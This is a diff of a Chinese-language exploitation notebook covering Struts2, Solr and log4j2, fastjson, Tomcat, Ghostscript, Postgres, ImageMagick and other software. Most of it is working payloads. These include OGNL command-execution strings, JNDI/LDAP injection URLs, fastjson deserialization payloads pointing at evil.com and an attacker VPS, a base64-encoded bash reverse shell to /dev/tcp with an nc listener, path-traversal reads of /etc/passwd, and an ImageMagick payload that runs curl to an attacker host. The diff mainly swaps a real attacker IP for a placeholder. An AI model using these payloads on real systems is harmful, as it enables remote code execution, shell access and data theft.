@@ -18,17 +18,40 @@
     - [Flask](#Flask)
         - [Jinja2](#Jinja2)
     - [Django](#Django)
-- [Struts2](#Struts2)
-    - [s2-009](#s2-009)
-    - [s2-012](#s2-012)
-    - [s2-013](#s2-013)
-    - [s2-015](#s2-015)
-    - [s2-045](#s2-045)
-    - [s2-048](#s2-048)
-    - [s2-052](#s2-052)
-    - [s2-053](#s2-053)
-    - [s2-057](#s2-057)
-- [httpd](#httpd)
+
+- [框架引擎中间件](#框架引擎中间件)
+    - [Nginx](#Nginx)
+    - [httpd](#httpd)
+        - [Apache—HTTPD-多后缀解析漏洞](#Apache—HTTPD-多后缀解析漏洞)
+    - [Struts2](#Struts2)
+        - [s2-009](#s2-009)
+        - [s2-012](#s2-012)
+        - [s2-013](#s2-013)
+        - [s2-015](#s2-015)
+        - [s2-045](#s2-045)
+        - [s2-048](#s2-048)
+        - [s2-052](#s2-052)
+        - [s2-053](#s2-053)
+        - [s2-057](#s2-057)
+    - [Elasticsearch](#Elasticsearch)
+        - [CVE-2014-3120](#CVE-2014-3120)
+        - [CVE-2015-1427](#CVE-2015-1427)
+        - [CVE-2015-3337](#CVE-2015-3337)
+    - [Solr](#Solr)
+        - [log4j组件](#log4j组件)
+    - [tomcat](#tomcat)
+        - [CVE-2017-12615](#CVE-2017-12615)
+        - [Tomcat8+弱口令+后台getshell漏洞](#Tomcat8+弱口令+后台getshell漏洞)
+
+- [组件](#组件)
+    - [fastjson](#fastjson)
+        - [漏洞扫描探测](#漏洞扫描探测)
+        - [1.2.24-rce](#1.2.24-rce)
+        - [1.2.47-rce](#1.2.47-rce)
+    - [log4j2](#log4j2)
+        - [CVE-2021-44228-log4j2-rce漏洞](#CVE-2021-44228-log4j2-rce漏洞)
+
+
 - [Ruby](#Ruby)
     - [Rails](#Rails)
         - [CVE-2019-5418](#CVE-2019-5418)
@@ -38,36 +61,15 @@
 - [数据库](#数据库)
     - [Postgres](#Postgres)
         - [CVE-2019-9193](#CVE-2019-9193)
-- [搜索引擎](#搜索引擎)
-    - [Elasticsearch](#Elasticsearch)
-        - [CVE-2014-3120](#CVE-2014-3120)
-        - [CVE-2015-1427](#CVE-2015-1427)
-        - [CVE-2015-3337](#CVE-2015-3337)
+
 
 - [uWSGI](#uWSGI)
     - [CVE-2018-7490](#CVE-2018-7490)
 - [Jupyter](#Jupyter)
     - [notebook-rce](#notebook-rce)
 
-
-
 - [Imagetragick](#Imagetragick)
     - [CVE-2016–3714](#CVE-2016–3714)
-
-- [fastjson](#fastjson)
-    - [漏洞扫描探测](#漏洞扫描探测)
-    - [1.2.24-rce](#1.2.24-rce)
-    - [1.2.47-rce](#1.2.47-rce)
-
-- [tomcat](#tomcat)
-    - [CVE-2017-12615](#CVE-2017-12615)
-    - [Tomcat8+弱口令+后台getshell漏洞](#Tomcat8+弱口令+后台getshell漏洞)
-
-- [Apache-Solr](#Apache-Solr)
-    - [log4j组件](#log4j组件)
-- [Apache](#Apache)
-    - [log4j2](#log4j2)
-        - [CVE-2021-44228-log4j2-rce漏洞](#CVE-2021-44228-log4j2-rce漏洞)
 
 - [Grafana](#Grafana)
     - [Grafana插件模块目录穿越漏洞](#Grafana插件模块目录穿越漏洞)
@@ -265,7 +267,28 @@ id
 ### Django
 
 
-## Struts2
+## 框架引擎中间件
+
+### Nginx
+
+### httpd
+
+#### Apache—HTTPD-多后缀解析漏洞
+
+- 影响版本：2.4.0 < HTTPD <2.4.29
+
+- 参考文章
+    - https://github.com/vulhub/vulhub/tree/master/httpd/apache_parsing_vulnerability
+
+- 漏洞描述
+    - 在有多个后缀的情况下，只要一个文件含有.php后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。
+
+- 漏洞利用
+
+![image](./img/httpd-1.png)
+
+![image](./img/httpd-2.png)
+### Struts2
 
 探测工具：https://github.com/shack2/Struts2VulsTools
 
@@ -276,7 +299,7 @@ S2-046以后的洞难以扫出来，需要自己寻找利用点，简单来说�
 其它利用工具
 - https://github.com/HatBoy/Struts2-Scan - Python3 Struts2 全漏洞扫描利用工具
 
-### s2-009
+#### s2-009
 影响版本: 2.1.0 - 2.3.1.1
 
 
@@ -292,7 +315,7 @@ env
 
 
 
-### s2-012
+#### s2-012
 
 影响版本：2.1.0 - 2.3.13
 
@@ -306,14 +329,14 @@ payload:(读取etc/passwd文件)
 %{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"env"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
 ```
 
-### s2-013
+#### s2-013
 
-### s2-015
+#### s2-015
 
 影响版本: 2.0.0 - 2.3.14.2
-### s2-045
+#### s2-045
 
-### s2-048
+#### s2-048
 
 影响版本: 2.0.0 - 2.3.32
 
@@ -325,7 +348,7 @@ payload:(读取etc/passwd文件)
 
 ![image](./img/s2-048.png)
 
-### s2-052
+#### s2-052
 
 影响版本: Struts 2.1.2 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12
 
@@ -338,7 +361,7 @@ payload:(读取etc/passwd文件)
 Python struts-pwn.py --exploit --url "http://node4.buuoj.cn:26796/orders/4/edit" -c "wget ip:port"
 ```
 
-### s2-053
+#### s2-053
 
 影响版本: Struts 2.0.1 - Struts 2.3.33, Struts 2.5 - Struts 2.5.10
 
@@ -356,7 +379,7 @@ http://your-ip:8080/hello.action
 ```
 ![image](./img/s2-053.png)
 
-## S2-057
+#### S2-057
 
 影响版本:<= Struts 2.3.34, Struts 2.5.16
 
@@ -376,73 +399,6 @@ http://node3.buuoj.cn:29922/struts2-showcase/%24%7B%28%23dm%3D@ognl.OgnlContext@
 ```
 
 ![image](./img/s2-057.png)
-
-## httpd
-
-## Ruby
-
-### Rails
-
-Ruby on Rails是一个 Web 应用程序框架,是一个相对较新的 Web 应用程序框架，构建在 Ruby 语言之上。
-
-#### CVE-2019-5418
-
-漏洞影响：
-Ruby on Rails < 6.0.0.beta3
-Ruby on Rails < 5.2.2.1
-Ruby on Rails < 5.1.6.2
-Ruby on Rails < 5.0.7.2
-
-```
-GET /robots HTTP/1.1
-Host: your-ip:3000
-Accept-Encoding: gzip, deflate
-Accept: ../../../../../../../../etc/passwd{{
-Accept-Language: en
-User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
-Connection: close
-```
-![image](./img/1.png)
-## PostScript
-
-### Ghostscript
-#### CVE-2018-16509
-
-需要上传的poc.png
-```
-%!PS
-userdict /setpagedevice undef
-save
-legal
-{ null restore } stopped { pop } if
-{ legal } stopped { pop } if
-restore
-mark /OutputFile (%pipe%id > /tmp/success && cat /tmp/success) currentdevice putdeviceprops
-```
-
-![image](./img/postscript1.png)
-
-
-## 数据库
-
-### Postgres
-
-#### CVE-2019-9193
-
-Navicat连接数据库，数据库初始账号密码为postgres/postgres
-
-影响版本：PostgreSQL 9.3-11.2
-poc
-```
-DROP TABLE IF EXISTS cmd_exec;
-CREATE TABLE cmd_exec(cmd_output text);
-COPY cmd_exec FROM PROGRAM 'id';
-SELECT * FROM cmd_exec;
-```
-
-![image](./img/postgres1.png)
-
-## 搜索引擎
 
 ### Elasticsearch
 
@@ -558,116 +514,19 @@ Host: node4.buuoj.cn:25305
 
 ![image](./img/cve-2015-3337.png)
 
-## uWSGI
+### solr
+#### log4j组件
 
-uWSGI是一款Web应用程序服务器，它实现了WSGI、uwsgi和http等协议，并支持通过插件来运行各种语言。
+Apache Solr Log4j组件 远程命令执⾏漏洞
 
-### CVE-2018-7490
-
-uWSGI 2.0.17之前的PHP插件，没有正确的处理DOCUMENT_ROOT检测，导致用户可以通过..%2f来跨越目录，读取或运行DOCUMENT_ROOT目录以外的文件。
-
-
+payload：
 ```
-http://your-ip:8080/..%2f..%2f..%2f..%2f..%2fetc/passwd
+/solr/admin/collections? action=${jndi:ldap://xxx/Basic/ReverseShell/ip/87}&wt=json
 ```
 
-![image](./img/uWSG.png)
+### tomcat
 
-## Jupyter
-
-Jupyter Notebook（此前被称为 IPython notebook）是一个交互式笔记本，支持运行 40 多种编程语言。
-### notebook-rce
-
-Jupyter Notebook 未授权访问漏洞
-
-如果管理员未为Jupyter Notebook配置密码，将导致未授权访问漏洞，游客可在其中创建一个console并执行任意Python代码和命令。
-
-![image](./img/jupyter-rce1.png)
-![image](./img/jupyter-rce2.png)
-
-
-
-## Imagetragick
-
-ImageMagick是一款使用量很广的图片处理程序，很多厂商都调用了这个程序进行图片处理，包括图片的伸缩、切割、水印、格式转换等等。但近来有研究者发现，当用户传入一个包含『畸形内容』的图片的时候，就有可能触发命令注入漏洞。
-
-### CVE-2016–3714
-## fastjson
-
-Fastjson是阿里巴巴公司开源的一款json解析器，其性能优越，被广泛应用于各大厂商的Java项目中。fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。
-
-### 漏洞扫描探测
-
-- https://github.com/Maskhe/FastjsonScan
-
-需要post参数，没有参数的情况下填写（以下两种都可，否则为notsupport）
-```
-{}
-params=1
-```
-### 1.2.24-rce
-
-方法同理1.2.27，payload不一样
-
-```
-{
-    "b":{
-        "@type":"com.sun.rowset.JdbcRowSetImpl",
-        "dataSourceName":"rmi://evil.com:9999/TouchFile",
-        "autoCommit":true
-    }
-}
-```
-
-### 1.2.27-rce
-
-影响版本：fastjson <= 1.2.47
-
-**JNDI注入**
-
-相关工具：https://github.com/welk1n/JNDI-Injection-Exploit
-
-反弹shell需要先编码成base64
-
-在线java编码网站：[java.lang.Runtime.exec() Payload Workarounds](https://www.jackson-t.ca/runtime-exec-payloads.html)
-
-如：`sh -i >& /dev/tcp/1.117.51.253/8888 0>&1`需要先拖进去编码
-
-首先要启动一个 RMI 或者 LDAP 服务：在VPS上执行
-```
-java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "<payload>" -A <vps>
-java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjExNy41MS4yNTMvODg4OCAwPiYx}|{base64,-d}|{bash,-i}" -A 1.117.51.253
-```
-
-![image](./img/fastjson2.png)
-
-监听8888端口:
-
-```
-nc -lvnp 8888
-```
-
-目标站点抓包发送如下payload，header需要添加POST的`Content-Type: application/json`
-```
-{
-    "a":{
-        "@type":"java.lang.Class",
-        "val":"com.sun.rowset.JdbcRowSetImpl"
-    },
-    "b":{
-        "@type":"com.sun.rowset.JdbcRowSetImpl",
-        "dataSourceName":"ldap://1.117.51.253:1389/yomh4h",
-        "autoCommit":true
-    }
-}
-```
-![image](./img/fastjson1.png)
-
-![image](./img/fastjson3.png)
-
-## tomcat
-
-### CVE-2017-12615
+#### CVE-2017-12615
 > Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）
 
 当 Tomcat 运行在 Windows 主机上，且启用了 HTTP PUT 请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求向服务器上传包含任意代码的 JSP 文件。之后，JSP 文件中的代码将能被服务器执行。
@@ -712,7 +571,7 @@ Connection: close
 参考文章：
 - https://blog.csdn.net/qq_36241198/article/details/114883818
 
-### Tomcat8+弱口令+后台getshell漏洞
+#### Tomcat8+弱口令+后台getshell漏洞
 
 Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。其中，欲访问后台，需要对应用户有相应权限。
 
@@ -744,17 +603,182 @@ run
 参考文章：
 - https://www.cnblogs.com/qianxinggz/p/13440366.html
 
+## Ruby
 
-## Apache-solr
-### log4j组件
+### Rails
 
-Apache Solr Log4j组件 远程命令执⾏漏洞
+Ruby on Rails是一个 Web 应用程序框架,是一个相对较新的 Web 应用程序框架，构建在 Ruby 语言之上。
 
-payload：
+#### CVE-2019-5418
+
+漏洞影响：
+Ruby on Rails < 6.0.0.beta3
+Ruby on Rails < 5.2.2.1
+Ruby on Rails < 5.1.6.2
+Ruby on Rails < 5.0.7.2
+
 ```
-/solr/admin/collections? action=${jndi:ldap://xxx/Basic/ReverseShell/ip/87}&wt=json
+GET /robots HTTP/1.1
+Host: your-ip:3000
+Accept-Encoding: gzip, deflate
+Accept: ../../../../../../../../etc/passwd{{
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
 ```
-## Apache
+![image](./img/1.png)
+## PostScript
+
+### Ghostscript
+#### CVE-2018-16509
+
+需要上传的poc.png
+```
+%!PS
+userdict /setpagedevice undef
+save
+legal
+{ null restore } stopped { pop } if
+{ legal } stopped { pop } if
+restore
+mark /OutputFile (%pipe%id > /tmp/success && cat /tmp/success) currentdevice putdeviceprops
+```
+
+![image](./img/postscript1.png)
+
+
+## 数据库
+
+### Postgres
+
+#### CVE-2019-9193
+
+Navicat连接数据库，数据库初始账号密码为postgres/postgres
+
+影响版本：PostgreSQL 9.3-11.2
+poc
+```
+DROP TABLE IF EXISTS cmd_exec;
+CREATE TABLE cmd_exec(cmd_output text);
+COPY cmd_exec FROM PROGRAM 'id';
+SELECT * FROM cmd_exec;
+```
+
+![image](./img/postgres1.png)
+
+
+## uWSGI
+
+uWSGI是一款Web应用程序服务器，它实现了WSGI、uwsgi和http等协议，并支持通过插件来运行各种语言。
+
+### CVE-2018-7490
+
+uWSGI 2.0.17之前的PHP插件，没有正确的处理DOCUMENT_ROOT检测，导致用户可以通过..%2f来跨越目录，读取或运行DOCUMENT_ROOT目录以外的文件。
+
+
+```
+http://your-ip:8080/..%2f..%2f..%2f..%2f..%2fetc/passwd
+```
+
+![image](./img/uWSG.png)
+
+## Jupyter
+
+Jupyter Notebook（此前被称为 IPython notebook）是一个交互式笔记本，支持运行 40 多种编程语言。
+### notebook-rce
+
+Jupyter Notebook 未授权访问漏洞
+
+如果管理员未为Jupyter Notebook配置密码，将导致未授权访问漏洞，游客可在其中创建一个console并执行任意Python代码和命令。
+
+![image](./img/jupyter-rce1.png)
+![image](./img/jupyter-rce2.png)
+
+
+
+## Imagetragick
+
+ImageMagick是一款使用量很广的图片处理程序，很多厂商都调用了这个程序进行图片处理，包括图片的伸缩、切割、水印、格式转换等等。但近来有研究者发现，当用户传入一个包含『畸形内容』的图片的时候，就有可能触发命令注入漏洞。
+
+### CVE-2016–3714
+
+## 
+## fastjson
+
+Fastjson是阿里巴巴公司开源的一款json解析器，其性能优越，被广泛应用于各大厂商的Java项目中。fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。
+
+### 漏洞扫描探测
+
+- https://github.com/Maskhe/FastjsonScan
+
+需要post参数，没有参数的情况下填写（以下两种都可，否则为notsupport）
+```
+{}
+params=1
+```
+### 1.2.24-rce
+
+方法同理1.2.27，payload不一样
+
+```
+{
+    "b":{
+        "@type":"com.sun.rowset.JdbcRowSetImpl",
+        "dataSourceName":"rmi://evil.com:9999/TouchFile",
+        "autoCommit":true
+    }
+}
+```
+
+### 1.2.27-rce
+
+影响版本：fastjson <= 1.2.47
+
+**JNDI注入**
+
+相关工具：https://github.com/welk1n/JNDI-Injection-Exploit
+
+反弹shell需要先编码成base64
+
+在线java编码网站：[java.lang.Runtime.exec() Payload Workarounds](https://www.jackson-t.ca/runtime-exec-payloads.html)
+
+如：`sh -i >& /dev/tcp/111.111.111.111/8888 0>&1`需要先拖进去编码
+
+首先要启动一个 RMI 或者 LDAP 服务：在VPS上执行
+```
+java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "<payload>" -A <vps>
+java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjExNy41MS4yNTMvODg4OCAwPiYx}|{base64,-d}|{bash,-i}" -A 111.111.111.111
+```
+
+![image](./img/fastjson2.png)
+
+监听8888端口:
+
+```
+nc -lvnp 8888
+```
+
+目标站点抓包发送如下payload，header需要添加POST的`Content-Type: application/json`
+```
+{
+    "a":{
+        "@type":"java.lang.Class",
+        "val":"com.sun.rowset.JdbcRowSetImpl"
+    },
+    "b":{
+        "@type":"com.sun.rowset.JdbcRowSetImpl",
+        "dataSourceName":"ldap://111.111.111.111:1389/yomh4h",
+        "autoCommit":true
+    }
+}
+```
+![image](./img/fastjson1.png)
+
+![image](./img/fastjson3.png)
+
+
+
+
 ### Log4j2
 
 Apache Log4j2 是一个基于 Java 的日志记录工具。该工具重写了 Log4j 框架，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。在大多数情况下，开发者可能会将用户输入导致的错误信息写入日志中。攻击者利用此特性可通过该漏洞构造特殊的数据请求包，最终触发远程代码执行。
@@ -863,7 +887,7 @@ Content-Type: image/png
 
 push graphic-context
 viewbox 0 0 640 480
-fill 'url(https://127.0.0.0/oops.jpg"|curl "1.117.51.253:8889)'
+fill 'url(https://127.0.0.0/oops.jpg"|curl "111.111.111.111:8889)'
 pop graphic-context
 ------WebKitFormBoundarymdcbmdQR1sDse9Et--
 ```
